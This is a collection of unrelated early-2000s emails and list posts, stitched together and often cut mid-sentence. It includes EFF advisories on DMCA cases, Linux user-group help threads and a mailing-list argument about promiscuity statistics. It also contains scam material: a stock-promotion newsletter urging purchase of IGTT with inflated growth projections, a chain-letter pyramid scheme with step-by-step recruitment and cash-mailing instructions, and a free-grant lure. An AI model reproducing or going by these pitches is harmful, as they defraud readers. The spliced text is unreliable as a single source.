 outlaws breaking into a third-party's property in order to steal
 data that one is not entitled to. This prosecution marks the first
 time the law will be used to prosecute a person for accessing his
 own property (his own DVD). Johansen faces two years in prison if
 convicted. The prosecution is based on a formal complaint filed by
 the Motion Picture Association.
 
 The trial had originally been scheduled to take place in June of 
 2002 but was rescheduled when the court could not find any qualified 
 judges to hear Johansen's case.  Now the case is scheduled to be 
 heard by a three-judge panel. Help Jon in his battle against

 * Bunnie Presents Paper on XBox Reverse Engineering
 
 Paper Explains Flaw in Videogame Security System
 
 Researcher Escapes Chilling Effect of Digital Copyright Law
 
 Electronic Frontier Foundation Media Advisory
 
 For Immediate Release: Thursday, August 9, 2002
 
 San Francisco - The Electronic Frontier Foundation (EFF) is pleased
 to announce that former MIT doctoral student Andrew ""Bunnie"" Huang
 will present a paper explaining a security flaw in the Microsoft
 Xbox (TM) videogame system.
 
 Huang will present his paper, ""Keeping Secrets in Hardware: the
 Microsoft X-BOX Case Study,"" at 5:25 p.m. PDT on August 13, 2002, at
 the 2002 Workshop on Cryptographic Hardware and Embedded Systems
 (CHES 2002) in Redwood City, California (Aug. 13-15, 2002).
 
 The Xbox security system is intended to allow people to play only
 videogames authorized by Microsoft. Huang's paper ""shows how a
 person could defeat that system with a small hardware investment,""
 said MIT Professor Hal Abelson, one of Huang's advisors. ""More
 importantly, the paper relates the security vulnerability to a
 general design flaw shared by other high-profile security systems
 such as the government's Clipper Chip and the movie industry's
 Contents Scrambling System (CSS) for DVD players.""
 
 Huang contacted EFF in March after his advisors told him that his
 preliminary findings raised potentially significant legal questions.
 With the help of Boston College law professor Joe Liu, EFF worked
 with Huang, Abelson, and MIT administrators to analyze the legal
 issues and draft letters notifying Microsoft of Huang's research
 findings and intended publication, one of the steps encouraged by
 Digital Millennium Copyright Act (DMCA).
 
 Microsoft told Huang and Abelson that while it might prefer that the
 paper not be published, it would be inappropriate to ask MIT to
 withhold the paper.
 
 ""Microsoft deserves praise for making no attempt to control
 publication,"" said Abelson. ""Their response shows that they value
 academic freedom, and that they appreciate the critical role of
 unfettered research and publication in advancing technology.""
 
 Other companies have reacted otherwise, using the DMCA to threaten
 researchers. The Recording Industry Association of America last year
 warned Princeton Professor Edward Felten after his research team
 exposed weaknesses in digital music security technologies. Last
 month, Hewlett Packard (HP) threatened research collective SnoSoft
 over exposing a security vulnerability in HP's Tru64 Unix operating
 system. Soon after, HP clarified that it would not use the DMCA to
 stifle research or impede the flow of information that would improve
 computer security.
 
 Huang said that while he is glad he can openly present his paper,
 ""The DMCA clearly had a chilling effect on my work. I was afraid to
 submit my research for peer review until after the EFF's efforts to
 clear potential legal restraints.""
 
 ""Researchers should be analyzing security, not worrying about
 getting sued,"" said EFF Senior Staff Attorney Lee Tien.

 * Baen Books expands fair-use-friendly e-book program
 
 Baen Books will bind a CD-ROM into the October 2002 hardcover
 edition of *War of Honor,* the latest volume in David Weber's epic
 Honor Harrington space-opera. The CD will contain at least 22
 complete novels, all in open formats like html and RTF, with the
 fair-use-friendly admonishment ""This disk and its contents may be
 copied and shared but NOT sold."" Included on the disk are the entire
 Honor Harrington series to date, as well as other titles from the
 Baen line, including Keith Laumer's *Retief!* and Larry Niven and
 Jerry Pournelle's *Fallen Angels*.
 
 Baen has been a banner-carrier for fair-use in electronic
 publishing, shipping text and html files that can be played on a
 multitude of devices. Other publishers have chosen to publish their
 material in copy-controlled formats that make it impossible to
 legally loan or resell the titles you purchase, are locked to a
 specific device, can't play on every operating system, and
 occasionally lock out assistive technology like the screen-readers
 employed by the blind.
 
 Dmitry Skylarov, a Russian scientist, was arrested in July 2001, for
 demonstrating how end-users could defeat the copy-prevention
 employed by Adobe's e-book technology. Adobe asked the FBI to arrest
 Skylarov for violating the Digital Millennium Copyright Act (DMCA),
 which makes it a crime to describe techniques for circumventing
 copy-prevention technology. Though Skylarov was later released, his
 employer, ElcomSoft, is still facing charges in the USA, and the
 Russian government has issued an advisory warning Russian scientists
 to steer clear of American technical conferences until the DMCA is
 repealed.
 
 Here is Baen's statement on the CD release:
 
 You are about to start playing with a CD-ROM that has fairly
 extraordinary content. As of this writing it includes twenty-two
 UNENCRYPTED novels in several formats, the ten Honor Harrington
 Novels, 3 Honor Harrington Anthologies and 9 novels by friends of
 Honor, and by the time of distribution it may well contain more.
 (More than twenty novels for free, and with no stupid codes to work
 around. Think of that.) The reason for the plethora of formats is to
 try to please the people who want to read the novels on their Palm
 Pilots or other text-specialized palm-sized devices.

 It was clear you were talking about averages. But it should 
 be equally clear that that isn't what people mean when they
 use the word ""promiscuity"".

 Not at all. There are still people who only have one partner.
 There are many more whoe only have one partner over ""long""
 periods of time. So it is far from ""vacuous"" to describe some
 people as ""promiscuous"" and others as ""not promiscuous"", 
 especially over a set period. (""He was promiscuous in college.
 He is no longer promiscuous."")
 
 The word has a clear meaning, despite your continuing tendency 
 to gloss that meaning over with population averages.

 OK, then. Consider a population of 1,000,000. 500,000 men each
 pair off with 500,000 women. Then, 1 man, let's call him ""Wilt"",
 also has sex with the other 499,999 women. 
 
 499,999 women have had more than one partner. 499,999 men have
 only had one partner. It is now ""perfectly obvious"" that in the
 common meaning of the term, among this contrived population, 
 that women are ""more promiscuous"" than men -- even though the
 single ""most promiscuous"" person, Wilt, is a man.  
 
 ""Promiscuity"" is not ""exactly, perfectly identical between males 
 and females"", except under a degenerate custom definition of
 ""promiscuity"".
 
 > >unless ""promiscuity"" is defined uselessly.
 > 
 > Ain't nothin' useless about averages.
 
 Averages are useful, sure -- but much more so if called by their 
 actual name, rather than conflated with another concept.

975,"Subject: [ILUG] serial port transient failure
","Here's a weird and wacky problem:
 
 I'm currently out of the country with my trusty Evo N600c laptop. When I 
 tried to use the serial port to talk to my mobile phone, Linux behaved 
 pretty much as if the port was fried. Bizarre, I thought, because I'd 
 used it successfully while in the office. The only difference was that I 
 was trying the thing in the hotel. I entertained brief notions of having 
 somehow fried the serial drivers, then rebooted the laptop to Windows 
 and tried again. Worked perfectly. Back to Linux. Still not talking. 
 Considered that it might be flaky power, so I ran the laptop on battery. 
 Nope. Tried moving the laptop to a differnet part of the room where 
 there might be less bogon flux. Still not working. Eventually I gave up 
 and used the IrDA port instead - which is usually the serial connection 
 of doom, grief, and teeth-grinding.
 
 This morning, in the office, the damn thing is working without a hitch.
 
 Anyone like to suggest what mystery technology is in use in the hotel 
 that prevents serial ports from working under Linux?
 
 Cheers,
 Waider.

 <p align=""center""><strong>Telecom Consolidation Begins to Accelerate 
 </strong></p>
 <p align=""left""><font size=""5"">T</font>he Wall Street Bulletin believes 
 that the <a href=""http://moneycentral.msn.com/content/P26293.asp?special=msn"">recent 
 investment of capital into Level 3, lead by Warren Buffett</a>, 
 is further proof of the continued validity of the telecommunication 
 market when looked at from the perspective of the small to mid-sized 
 enterprises. After the boom and bust comes the revival. For some 
 carriers drowning in debt, such as Global Crossing and WorldCom, 
 the future may be dim. But for those survivors of the industry 
 that have managed to remain on their feet, other companies' problems 
 mean opportunity. &quot;Every major industry in the history of 
 the United States has experienced a similar transformation, from 
 the railroads in the late 1800s to the automakers in the mid-1900s 
 to the Dot-Coms at the end of the 20th century,&quot; says <a href=""http://www.commweb.com/article/COM20010403S0001"">Robert 
 Saunders</a>, director of the Eastern Management Group market 
 research firm. <a href=""http://www.eftia.com/about/exec/dean.html"">Christopher 
 Dean</a>, CTO of OSS company Eftia, says &quot;We are seeing all 
 the people that are the survivors. There's all this pent-up money 
 and for the surviving carriers out there, they can get what used 
 to cost a few billion for a few millions.&quot; <em>Read the full 
 story from Telecommunications Magazine - See the link at the end 
 of this newsletter.</em> </p>
 <p align=""left"">As we write this report, our New Recommendation 
 InDigiNet, Inc. (<a href=""http://moneycentral.msn.com/scripts/webquote.dll?ipage=qd&Symbol=igtt&SUBMIT1=Go"">OTCBB: 
 IGTT</a>) has only been trading on the OTC Bulletin Board since 
 late May of 2002. As InDigiNet, Inc. continues to implement its 
 business plan, we believe this company will help lead the way 
 up for the resurgence of the Telecom Sector. This could be our 
 strongest recommendation of the year. We are giving IGTT our Highest 
 Rating of STRONG BUY/AGGRESSIVE GROWTH.</p>
 <p align=""left"">&nbsp;</p>
 <p align=""center""><strong>Ground Floor Opportunity / Tremendous 
 Growth Potential </strong></p>
 <p align=""left"">We believe IGTT will perform equally to, if not 
 greater than its competition. A similar telecommunications company, 
 Talk America Holdings (Nasdaq: TALK), <a href=""http://bigcharts.marketwatch.com/quickchart/quickchart.asp?symb=talk&sid=0&o_symb=talk&freq=1&time=7"">share 
 price began to explode in April of this year moving from just 
 over $0.40/share to over $4.00/share in late June</a>. Talk America 
 Holdings previously had a market cap of only $24.51 million, but 
 today has a market cap of $267 million.</p>
 <p align=""left"">IGTT curently has a market cap of $22.42 million. 
 Using the TALK model for potential growth, IGTT could very well 
 be trading in the .60 range in only a few months, with a market 
 cap in excess of $250 million. This would be an increase of 1000%. 
 So you see why IGTT has such great potential and the time is right 
  for investors to get in on the ground floor.</p>
 <p>&nbsp;</p>
 <p align=""center""><strong>The <em>InDigNet</em> Strategy</strong></p>
 <p align=""left"">InDigiNet, Inc. is an integrated solutions company 
 that provides small to mid-sized enterprises (SMEs) with an integrated 
 communication solution. InDigiNet is a prestigious <a href=""http://tools.thestreet.com/tsc/quotes.html?pg=qcn&guid=%7B35CA79AF-6477-4734-90E1-97EC3455E773%7D&symb=igtt&sid=692861&orig=1&timer="">&quot;Diamond&quot; 
 level partner of Avaya</a>, as well as a reseller for Cisco and 
 Compaq. The Company will offer data, local, long distance and 
 wireless services to SMEs over third party networks enabling the 
 Company to offer a comprehensive suite of services without the 
 capital burden of building a communication network. The Company&#8217;s 
 strategy is to acquire the customer bases of smaller, single market 
 communication companies and attractively priced <a href=""http://webopedia.com/TERM/I/ISP.html"">Internet 
 Service Providers </a>(ISPs). <em>The Company recently completed 
 its acquisitions of Fox Telecommunications and WBConnect</em>. 
 InDigiNet will then expand the breadth of their services to grow 
 revenue and enhance profitability. SMEs account for $120 billion 
 in commercial telephony, data services and technology spending, 
 or 33% of the country&#8217;s total market, and this spending 
 is expected to grow at above average rates over the next ten years.

 <p align=""center""><strong>The<em> </em>IT Market</strong></p>
 <p align=""left"">Based on recent studies, the country&#8217;s 7.4 
 million SMEs currently lag significantly in the utilization of 
 <a href=""http://webopedia.com/TERM/I/IT.html"">IT</a> and data 
 communications, including Internet access, web services, business 
 software and e-commerce. Worldwide IT spending increased to $981 
 billion US for the year, an overall increase of 3.7 percent over 
 2001, according to a study released 7/24/2002 by market researcher 
 IDC. IT spending in 2003 is expected to reach record heights, 
 growing by 9 percent worldwide to top the $1 trillion mark for 
 the first time. In IDC's revised forecasts for IT spending in 
 2002 and 2003, IT spending in the US is expected to increase by 
 3 percent this year over 2001 to $436 billion, with further growth 
 of 9 percent in 2003. Western Europe can expect growth of 4 percent 
 in 2002 and 6 percent in 2003. Though Japan will experience flat 
 growth levels this year, by next year growth in the market will 
 return to the tune of 7 percent with particular strength shown 
 in China, India, Korea, Russia, the Philippines, South Africa 
 and Poland. <em>Source: <a href=""http://www.idc.com/en_US/st/aboutIDC.jhtml;jsessionid=2J2GJSTTFNK4MCTFA4FCFGAKMUDYWIWD"">IDC</a></em></p>
 <p align=""left"">&nbsp;</p>
 <p align=""center""><strong>Particulars</strong></p>
 <p align=""left"">The Wall Street Bulletin is putting IGTT on our 
 Strong Buy/Aggressive Growth recommendation list for the following 
 reasons:</p>
 <p align=""left"">1. The Company's strategy is to acquire the customer 
 bases of smaller, single-market communication companies and attractively 
 priced Internet Service Providers (ISPs). The Company will sell 
 its bundled service package to the acquired customer base that 
 will form a direct and immediate distribution channel for all 
 types of communication services - local, long distance, wireless, 
 and data. </p>
 <p align=""left""><br>
 2. The Company is currently serving many customers in the Denver/Front 
 Range communities but in particular the education vertical market 
 has recognized the value of integrating a wireless broadband data 
 network into the existing campus network. The Company's customers 
 include <a href=""http://www.usoc.org/"">United States Olympic Committee</a> 
 (USOC), <a href=""http://www.du.edu/"">University of Denver</a>, 
 and <a href=""http://www.colostate.edu/"">Colorado State University</a>. 
 </p>
 <p align=""left""><br>
 3. The Company has identified approximately $35,000,000 in revenues 
 to acquire comprised of distressed assets to be auctioned in bankruptcy 
 court and smaller communication providers with valuable customer 
 bases. Each of the targeted companies are within the Company's 
 footprint and will, subject to purchase completion, increase the 
 Company's embedded customer base. </p>
 <p>&nbsp;</p>
 <p align=""center""><strong>Investment Consideration</strong></p>
 <p align=""left"">InDigiNet Inc recently filed its 10QSB, for the 
 three months ended March 31, 2002. IGTT reported Revenues of $339,694 
 in Q1 2002 vs. Revenues of $0 in Q1 2001. At this current growth 
 rate, revenues should grow above $1.3 million for their first 
 year of production with no increases in acquisitions. As more 
 and more large corporations come under government scrutiny, investors 
 will turn to small to mid-sized companies with their investment 
 dollars. </p>

 Sounds like you're solving the wrong problem.  If untrusted strangers
 are relaying spam through your qmail server, it's a fair bet that
 you've seriously botched your qmail config (like forgetting to create
 an rcpthosts file or something).
 
 Anyway, if you insist on using razor to resolve this problem, I
 would suggest tossing qmail-scanner <http://qmail-scanner.sf.net/>
 and SpamAssassin <http://www.spamassassin.org/> into the mix as well.
 The former provides the qmail-integration framework on which the latter
 does its work (including razor-check invocations).
 
 Fair warning: It'll be far more resource-intensive than simply denying
 relaying privileges to everyone except the folks you trust.  To find
 out how to do that, go to <http://www.qmail.org/> (which, incidentally,
 should be your first stop for all things qmail) and search for ""qmail
 newbie's guide to relaying"".

","Hi All,
 
 Just wondering if anyone has ever installed StarOffice
 6.0 (or Open Office), and if any have experienced any
 problems with the install freezing ?
 
 I'm using RedHat 7.3 kernel 2.4.18-3, and glibc 2.2.5
 ?
 
 I might try downloading OpenOffice instead if it is
 unresolved!!!!
 
 Cheers all,

 Check your local friendly Red Hat installation:
 
 [root@localhost up2date]# rpm --checksig zsh-4.0.2-2.src.rpm
 zsh-4.0.2-2.src.rpm: md5 gpg ok
 
 Of course, this is only as useful as, say, the gpg keys distributed with 
 the Kernel tarballs, i.e. if you don't actually bother checking the sig 
 then you are open to abuse. It's entirely possible that rpm can be 
 configured to require good signatures, but I've not read that part of 
 the fine manual just yet.

 END OF LIST OF FIVE NAMES*********************
 
 Step 2.  These Guides will be emailed to you.  Save these
 Guides on your computer's hard disk as other people will be
 ordering these Guides from you, paying you for them and
 you will need to email the Guides to the new buyers.
 
 Step 3.  From the list of names above, delete the name and
 address of the person shown under GUIDE#5, and replace that
 slot with the name and address of the person from GUIDE #4's
 slot.  Be sure to copy the name and address exactly as shown.
 Check the address again.
 
 Step 4.  Delete name and address under GUIDE #4, and
 replace with the name and address from GUIDE #3's slot.
 
 Step 5.  Delete name and address under GUIDE #3, and
 replace with the name and address from  GUIDE#2's slot.
 
 Step 6.  Delete name and address under GUIDE #2, and
 replace with the name and address from GUIDE #1's slot.
 
 Step 7.  Delete name and address under GUIDE #1, and
 replace with YOUR OWN NAME AND ADDRESS. This
 step is how your own name and address is entered into the
 list of names to receive orders for the Guides. Eventually,
 your own name will go down the list of names until you have
 reached GUIDE #5, and then be dropped from the list. The
 key point is that the number of people ordering Guides from
 you will grow larger the lower down the list your name goes.
 
 Step 8.  Once you have completed this new list, send out
 this new email (which shows your name under GUIDE #1) to
 as many email addresses as possible, as many as 100,000
 emails or even more.  The greater the number of mailings
 you make, potentially the greater the number of people who
 will order the GUIDE #1 from you.  These people will then
 make new emails to send out to their addresses with the email
 showing your name under GUIDE #2, and so on.
 
 This is all you need to do.  If you wish to read the rest of
 this email message, then do so.  If not, just do the 8 steps
 shown above. Remember, the key point is to send out as
 many emails as possible in step 8, and to encourage and help
 those who purchase the Guides from you to send out
 emails of their own.
 
 Do NOT change anything other than what is instructed.
 Because if you do, it will not work for you.  Your immediate
 reaction might be: Why not replace all the names on the list
 with the names of your spouse, kids, relatives, and friends.
 That might seem to you like a clever move because new
 buyers will be sending their money to these people.  But
 that move is the exact opposite of what is to your benefit.
 What will benefit you most is having people who will send
 out emails, seek new buyers, and provide assistance to new
 buyers. If the people you slip into that list aren't going to
 be sending new emails, you're only hurting yourself by
 effectively closing down the program with your name on
 top of the list of the names that you have inserted.  There
 wouldn't be new buyers coming in. So, your sly maneuver
 will gain you exactly zero!  Furthermore, if you have done
 the work, and your name has worked its way to further
 down the list, by then you deserve the rewards and
 earnings from that effort, and it would be unethical for
 anyone to remove your name for whatever reason.  Don't
 do it to others. Remember, honesty reaps the reward!!!
 
 You may have a concern that after sending the total $50 to
 the five people on the list that one of the people will just
 take your money, and not send you the Guide.  Well, rest
 assured.  As we said above, it's to our benefit to have you
 as a satisfied buyer who will actively send out emails to find
 new buyers.  So don't think the people on the list will try to
 cheat you or to ""stiff"" you for $10.00.  The people on the list
 would rather have you working hard because your effort will
 benefit them as well as you.  Later on, when other buyers send
 you the order to buy the Guides, fulfill your end of the deal
 by sending the ordered Guide to the buyer.  Don't cheat.
 Provide efficient and honest service and we will all benefit.
 ******END OF SUMMARY************************
 
 =======REST OF MESSAGE======================
 
 With easy-to-use email tools and opt-in email, success in
 this business is now well within the capabilities of ordinary
 people who may not have done any internet marketing before.
 And the earnings potential is staggering!
 
 READ THIS EMAIL TO THE END! -
 follow what it says  - and you will not worry whether a
 RECESSION is coming or not, or whether or not you can
 afford to buy that new car or home that you have been
 looking for.  Yes, I know what you are thinking. I never
 responded to one of these before either. One day though,
 something made me feel: ""You use $50 going to a movie
 for 2 hours with your spouse, friend, or child, plus a simple
 meat at a restaurant.  Why the heck not?""  No matter where
 you believe those ""feelings"" came from, I thank every day
 that feeling came over me.
 
 I cannot imagine where I would be or what I would be doing
 had I not. Read on. It works.  And when you read the Guides,
 Youll learn how to become a more effective communicator.
 What can be better?  A way to improve your self-image and
 confidence and at the same time have the potential to recover
 your investment and make some good money: making over
 half a million dollars every 4 to 5 months from your home.
 If you work on this program, you will learn a lot about direct
 marketing on the internet.  If you believe direct marketing
 via the internet is the way sales and marketing will be done
 in the future, then the experience you will gain here could
 be a real boost in your work career, possibly even providing
 a new career for you.
 
 = PRINT THIS MESSAGE FOR FUTURE REFERENCE =
 
 If you want to make serious money, read this message until
 you understand it completely and feel confident to follow
 through on what it advises.
 
 FOLLOW THE SIMPLE INSTRUCTION ABOVE AND
 YOUR FINANCIAL DREAMS CAN COME TRUE!
 
 Remember, this method has been tested, and if you alter it,
 it will NOT work!  This IS a legitimate BUSINESS. You
 are offering a product for sale to a buyer. Treat it as such
 and you can see money coming to you  in a reasonable period
 of time, depending on the collective efforts of yourself and
 the others on the list of five.

 CHANGES.  There are 2 methods to get this venture going:
 
 METHOD # 1: BY SENDING BULK EMAIL LEGALLY
 ===========================================
 
 Let's say that you start small, to see how it goes, and that
 you and those involved send out only 5,000 emails each.
 Let's also assume that the mailing receives only a 0.1%
 (1/10 of 1%) response (the response could be much better
 but let's just say it is only 0.1%). Also many people will
 send out hundreds of thousands of emails instead of only
 5,000 each.
 
 Out of your 5,000 emails and a 0.1% response, that is only
 5 orders for Guide # 1. Those 5 people who responded also
 send out 5,000 emails each for a total of 25,000. Out of
 those 25,000 emails only 0.1% responded with orders.
 That's 25 people who responded and ordered Guide # 2.
 
 Those 25 people mail out 5,000 e-mails each for a total of
 125,000 emails. The 0.1% response to that is 125 orders
 for Guide # 3. Those 125 people send 5,000 emails each
 for a total of 625,000 emails sent out. The 0.1% response
 is 625 orders for Guide # 4.
 
 Those 625 people send out 5,000 emails each for a total
 of 3,125,000 emails. The 0.1% response to that is  3,125
 orders for Guide # 5, or $31,250 at $10 per Guide.  This
 may seem a small amount to you, but remember we used a
 very low response rate with a small number of emails being
 sent out.  See what happens if you can get the response rate
 up just slightly.
 
 If Response Rate is 0.1%, income from Guides #1 - #5 is:
 $50+250+1,250+6,250+31,250 = $39,050 (as above)
 
 If Response Rate is 0.15%, income from Guides #1 - #5 is:
 $75+560+4,220+31,640+237,300 = $273,795
 
 If Response Rate is 0.2%, income from Guides #1 - #5 is:
 $100+1,000+10,000+100,000+1,000,000 = $1,111,100
 
 Dare to think for a moment what would happen if everyone
 or half or even one 4th of those people mailed 100,000
 emails each or more?  From the example above, you can see
 the power of leveraging, that is, how much greater is the
 amount of money from a small increase in the response rate.
 
 There are over 200 million people on the internet worldwide
 and counting, with thousands more coming online every day.
 
 METHOD # 2: PLACING FREE ADS ON THE INTERNET
 ===========================================
 
 Advertising on the net is very, very inexpensive and there are
 Many FREE places to advertise. Placing a lot of free ads on
 the internet will get a response. We strongly suggest you start
 with  Method # 1 and add METHOD # 2 as you go along.
 For every $10 you receive, all you must do is email the
 Guide the buyer ordered. Always provide same day service.
 
 The people you buy these Guides from will assist and advise
 you how to get the large number of email addresses that
 you need to send the new email containing your name and
 address.  In return, when others buy the Guides from you,
 you also should help those buyers to resell the Guides to
 their email addresses.  This will benefit you because your
 name would be further down the list, and their new buyers
 will buy from you.  This is no different than ""customer
 service"" in the retail or the  ""bricks and mortars"" business.
 
 ===========AVAILABLE GUIDES ==============
 The reason for the ""cash"" is not because this is illegal or
 somehow  ""wrong"". It is simply about time. Time for checks
 or credit cards to be cleared or approved, etc. Concealing it
 is simply so no one can SEE there is money in the envelope
 and steal it before it gets to you.
 
 ORDER EACH GUIDE BY ITS NUMBER & NAME ONLY.
 Always send a single $10 bill (U.S. CURRENCY) for each
 Guide.  Checks NOT accepted. Make sure the cash is hidden
 by wrapping it in at least 2 sheets of paper. On one of
 those sheets of paper, write the NUMBER & the NAME
 of the Guide you are ordering, YOUR EMAIL ADDRESS
 and your name and postal address.  Be sure to address the
 envelope correctly and put the proper amount of stamps to
 mail the envelope.
 
 PLACE YOUR ORDER FOR THESE GUIDES NOW
 FROM THE NAME AND ADDRESS LIST SHOWN
 AT THE BEGINNING OF THIS EMAIL
 ________________________________________________
 YOUR SUCCESS GUIDELINES
 
 === If you do not receive at least 10 orders for GUIDE #1
 within 2 weeks, continue sending emails until you do.
 
 === Two to three weeks after you receive 10 orders,
 you should receive 100 orders or more for GUIDE #2. If
 not, continue advertising or sending emails until you do.
 
 Once you have received 100 or more orders for GUIDE # 2,
 YOU CAN SEE THE PROGRAM IS WORKING, and
 cash should continue coming in! THIS IS IMPORTANT
 TO REMEMBER:  Continue to assist new buyers with advice
 and instruction on how to send out more emails. You can
 KEEP TRACK of progress by noting which guides people
 are ordering from you. IF YOU WANT TO GENERATE
 MORE INCOME SEND ANOTHER BATCH OF EMAILS
 AND START THE WHOLE PROCESS AGAIN.
 There is NO LIMIT to the income you can generate !!!
 ===========================================
 A NOTE FROM THE ORIGINATOR OF THIS PROGRAM:
 You have just received information that can give you
 financial freedom to really change your life, but I don't
 wish to kid you:  This requires A BIT OF EFFORT. You
 can make more money in the next few weeks and months
 than you have ever imagined. Follow the program
 EXACTLY AS INSTRUCTED.
 
 Remember to email the revised copy of this email after you
 have put your name and address in GUIDE#1 and moved
 others to #2 .....# 5 slots as instructed above. One of the
 people you send this to may send out 100,000 or more
 emails and your name will be on every one of them.
 Remember, the more you send out the more potential
 buyers you will reach.
 
 IT IS UP TO YOU!  ORDER THE GUIDES NOW AND
 EMBARK ON THE ROAD TO FINANCIAL SECURITY!
 
 Upon your purchase of any GUIDE #1 through #5, the
 Copyright owner assigns to you two important rights:
 (1) The right to resell and to distribute via the internet the
 GUIDE that you have purchased, and (2) the right to assign
 to your buyer of the GUIDE, the further right for your buyer
 to resell that GUIDE.  Included in your purchase of Guide #1
 is a valuable report on how to market on the Internet. It's
 free of charge and will give you the tools you need.
 
 The right to print any of the material contained in the GUIDES
 is reserved exclusively for the copyright owner.  Your right to
 resell and to distribute copies of the GUIDE applies only to the
 internet and/or world wide web via electronic distribution.
 YOU MAY NOT PRINT OUT THE GUIDES TO SELL OR
 DISTRIBUTE IN ANY WAY.  You may print a copy of the
 Guides for your own personal use to enhance your
 communication skills.

988,"Subject: Re: making rpms from already-compiled source trees
","Well, thanks everyone for the explanations. I still disagree with the 
 reasoning, but it seems this is one of those philosophical questions 
 that I'm on the losing end of :)
 
 The checkinstall utility that someone mentioned seems useful, but I 
 don't really have the time to figure it out right now. After searching 
 the web some more, I found out that Mandrake's version of rpm is 
 patched to support what I wanted. So I guess I'll look into that when 
 I get a chance.

 As far as I can tell, this could be useful for my situation too. It's 
 not a complete solution since I can't really distribute the SRPMS with 
 full certainty that they work, but at least I can make RPMS for local 
 use by tarring up the buildroot directory and then using the above 
 technique. All I really want is to get dependency tracking for 
 everything installed on my system (including software from cvs). This 
 just makes it a little bit faster.

 It was a extreme contrived example because you glosded over the 
 point of the earlier 3-person example. 
 
 But OK, Mr Math, let it be N men and women, for any N>2. They 
 all pair off. Then, some number H, N>H>0, of men has sex with 
 all the other N-1 women he hasn't yet had sex with. 
 
 Pick any N and H that might be interesting. Any choice of
 values results in meaningful differences between the sexes' 
 ""promiscuity"", as commonly understood. It should be more 
 obvious with extreme choices of numbers, but it is also true 
 for any choice of N and H, if unrealistic totals distract you.
 
 Further, and I was hoping this would be clear without saying
 so outright, this model actually approximates the cliche 
 ""common wisdom"" about per-gender sexual behavior, if you 
 reverse the male and female roles.
 
 Those stereotypes are: that more men than women seek multiple
 partners -- men being ""more promiscuous"" than women -- and that 
 surplus of male interest is satisfied by a smaller number of 
 hyperpromiscuous women (often derisively labelled ""sluts"").

 Nope, now you've amended the meaning of your initial statement to
 make it more defensible. What I objected to was:
 
 Robert Harley:
 # >The assumption that females of all species tend to be less promiscuous
 # >than males simply does not fit the facts, Hrdy contended.
 # 
 # Well, DUH!!!
 # 
 # It is perfectly obvious that (heterosexual) promiscuity is exactly,
 # precisely identical between males and females.
 # 
 # Of course the shapes of the distributions may differ.
 
 If you assumed people on FoRK had a clue, would you have needed
 to jump in with a patronizing ""DUH!!""? 
 
 If you were talking about fuzzy, typical behavior, would you have 
 huffed and puffed with the words ""perfectly obvious"" and ""exactly, 
 precisely identical""? 
 
 If your concern was with the ""typical"", why didn't you adopt the 
 typical definition of ""promiscuous"", rather than a straw-man
 definition which allowed you to interject ""DUH!!"" and mock an
 anthrolopology professor's conclusions?

 You are welcome to that theory!
 
 But here's an alternate theory: when you jump in with a patronizing 
 and overblown pronouncement -- e.g. ""DUH!!... perfectly obvious...

  Too many people can qualify for this program, so by limiting the initial =
 applicants<br>
  to the most serious,  sincere and honest individuals. It will ensure that=
  the <br>
 program money is used for beneficial, constructive uses. <br>
  Remember there is <b>no risk</b> on your part.<br>
 Also, each Grant is usually a <b>minimum of $10,000,</b> so this is a grea=
 t opportunity!</b><br><br>

 SEE IF YOU ARE ELIGIBLE FOR A LARGER GRANT!</a><br><br></center>
 
 <br> If you do not qualify for the Free Grant Program, <b>you lose nothing=
 !</b><br>
 But if you don't even apply, you lose EVERYTHING! <br>Remember,
  not everyone gets this opportunity, <br>
 and you get to be one of the first people to apply! <br>
 So your chances are so much higher!<br><br><br><br>
